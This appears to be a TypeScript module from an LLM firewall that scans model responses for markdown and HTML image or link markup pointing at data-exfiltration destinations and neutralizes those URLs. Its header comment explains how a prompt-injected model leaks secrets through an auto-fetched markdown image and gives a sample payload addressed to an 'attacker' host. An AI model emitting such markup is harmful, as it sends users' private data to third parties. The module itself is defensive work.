// Response-side exfiltration detection.
//
// A model whose context was poisoned (indirect prompt injection) often exfils
// data by emitting markup the CLIENT auto-renders. The classic zero-click vector
// is a markdown image — `![x](https://attacker/?d=<secret>)` — which the chat UI
// fetches immediately, leaking the query string to the attacker without the user
// ever clicking. Markdown/HTML links are the one-click variant. The firewall sees
// this in the model's RESPONSE, not the request, so it needs its own scan.
//
// This module is pure: it extracts candidate URLs from response text and asks an
// injected predicate whether each destination is an exfil sink (the proxy backs
// that predicate with the existing UrlClassifier, so the allowlist, known-sink
// list, DGA and path-exfil heuristics are all reused). No network, no provider
// coupling — it scans the raw decoded body, so it works for every provider shape.

export interface ExfilFinding {
  url: string
  /** How the URL was embedded — markdown image is the highest concern (auto-fetched). */
  kind: 'markdown-image' | 'markdown-link' | 'html-image'
  reason: string
}

// Every URL pattern also takes a scheme-relative `//host/...`, which a
// browser resolves to https (parseUrl does the same).
const IS_URL = /^(?:https?:)?\/\//i
// `![alt](url)` and `[text](url)` are read from the `](` both share, in one
// pass (inlineDestinations). Patterns anchored on the opening bracket restarted
// at every `[` and ran to the end of the text when the markup never closed, on
// the thread serving every client: 6 s on 200 KB (GHSA-ggrw-cm2f-mh3c).
const BRACKET_RE = /!\[|\[|\]\(?/g
// A destination, after whitespace and an optional `<`. It stops at whitespace,
// ')' or '>'. Nothing follows the run, so it never backtracks.
const DEST_RE = /\s*<?([^\s)>]*)/y
// Deep enough for any real nesting, and it keeps `[[[[...` from filling memory.
// Past it an inner bracket is not tracked, which can only mislabel a finding.
const MAX_BRACKET_DEPTH = 1024
// `[label]: url` — a link reference definition (#574). `![alt][label]` (and
// `![label]`) fetch its URL like an inline image, so it is reported as one.
// Any `]:` before a URL counts, whatever starts the line: a definition may sit
// in a blockquote or a list item, its label may hold escapes, and the body is
// often raw JSON with escaped line breaks, so recognising "a definition line"
// exactly as a renderer does is a parser differential waiting to happen.
// Only an exfil destination is ever reported, so a `]:` in prose costs
// nothing unless it points at one. The destination may follow on the next
// line, after one line ending, raw or JSON-escaped.
const MD_DEF_RE = /\]:[ \t]*(?:(?:\r?\n|\\r\\n|\\n)[ \t]*)?<?((?:https?:)?\/\/[^\s>"\\]+)/gi
// `<img ... src="url">` — HTML image (some renderers allow raw HTML). Each tag
// is read once, to its `>` outside quotes (imgTags), and its src taken from that
// tag alone. One regex with a lazy attribute scan restarted at every `<img`
// and ran to the end of the text when no URL followed: 400 KB of `<img src="`
// took 10.5 s on the request thread (GHSA-983r-9gmc-f3xr). In a raw JSON body
// the attribute's quote arrives escaped (`src=\"...\"`).
const IMG_OPEN_RE = /<img\b/gi
const SRC_ATTR_RE = /\bsrc\s*=\s*\\?["']?((?:https?:)?\/\/[^"'\s>\\]+)/gi

/**
 * Every destination after a `](`, each read once: linear in `text`. A `](`
 * inside a destination that has not ended opens another one, so each of those
 * pieces is returned as well: a client that gives up on the outer markup may
 * still render the inner, and rereading from each `](` to the end of the run
 * would be quadratic. An image is one whose own opening bracket is `![`.
 */
function inlineDestinations(text: string): { url: string; image: boolean }[] {
  const found: { url: string; image: boolean }[] = []
  const open: boolean[] = []
  BRACKET_RE.lastIndex = 0
  for (let m = BRACKET_RE.exec(text); m !== null; m = BRACKET_RE.exec(text)) {
    const token = m[0]
    if (token === '[' || token === '![') {
      if (open.length < MAX_BRACKET_DEPTH) open.push(token === '![')
      continue
    }
    const image = open.pop() === true
    if (token === ']') continue
    DEST_RE.lastIndex = BRACKET_RE.lastIndex
    const url = DEST_RE.exec(text)?.[1] ?? ''
    BRACKET_RE.lastIndex = DEST_RE.lastIndex
    found.push({ url, image })
    if (url.includes('](')) {
      for (const inner of url.split('](')) found.push({ url: inner.replace(/^</, ''), image })
    }
  }
  return found
}

/** The text of each `<img ...>` tag, each read once: linear in `text`. */
function imgTags(text: string): string[] {
  const tags: string[] = []
  IMG_OPEN_RE.lastIndex = 0
  for (let m = IMG_OPEN_RE.exec(text); m !== null; m = IMG_OPEN_RE.exec(text)) {
    let i = m.index + m[0].length
    let quote = ''
    for (; i < text.length; i++) {
      const c = text[i]
      if (quote) { if (c === quote) quote = '' }
      else if (c === '"' || c === "'") quote = c
      else if (c === '>') break
    }
    tags.push(text.slice(m.index, i + 1))
    IMG_OPEN_RE.lastIndex = i + 1
  }
  return tags
}

function parseUrl(u: string): { hostname: string; path: string } | null {
  try {
    const url = new URL(u.startsWith('//') ? `https:${u}` : u)
    return { hostname: url.hostname, path: url.pathname + url.search }
  } catch {
    return null
  }
}

/**
 * Scan response text for exfiltration markup.
 *
 * @param text       the decoded model response (raw JSON/SSE text is fine — URLs
 *                   live inside the text fields and are matched literally)
 * @param isExfil    predicate deciding whether a (hostname, path) is an exfil
 *                   sink; backed by UrlClassifier in production
 * @returns deduped findings, markdown images first (highest concern)
 */
export function scanResponseExfil(
  text: string,
  isExfil: (hostname: string, path: string) => boolean,
): ExfilFinding[] {
  if (!text) return []
  const findings: ExfilFinding[] = []
  const seen = new Set<string>()

  const judge = (url: string, kind: ExfilFinding['kind']) => {
    const parsed = parseUrl(url)
    if (parsed && isExfil(parsed.hostname, parsed.path)) {
      const key = kind + '|' + url
      if (!seen.has(key)) {
        seen.add(key)
        findings.push({ url, kind, reason: `${kind} points at an exfiltration destination (${parsed.hostname})` })
      }
    }
  }
  const scan = (re: RegExp, kind: ExfilFinding['kind'], input = text) => {
    re.lastIndex = 0
    for (let m = re.exec(input); m !== null; m = re.exec(input)) {
      if (m[1]) judge(m[1], kind)
      if (m.index === re.lastIndex) re.lastIndex++
    }
  }

  const inline = inlineDestinations(text).filter(d => IS_URL.test(d.url))
  for (const d of inline) if (d.image) judge(d.url, 'markdown-image')
  scan(MD_DEF_RE, 'markdown-image')
  for (const tag of imgTags(text)) scan(SRC_ATTR_RE, 'html-image', tag)
  for (const d of inline) if (!d.image) judge(d.url, 'markdown-link')
  return findings
}

/**
 * Neutralize exfil URLs in a (buffered) response body by replacing each offending
 * URL with an inert placeholder, keeping the surrounding text/JSON intact so the
 * agent still receives a valid turn — just without the auto-fetch.
 */
export function neutralizeExfil(body: string, findings: ExfilFinding[]): string {
  let out = body
  for (const f of findings) {
    out = out.split(f.url).join('llm-fw-blocked-exfil-url')
  }
  return out
}
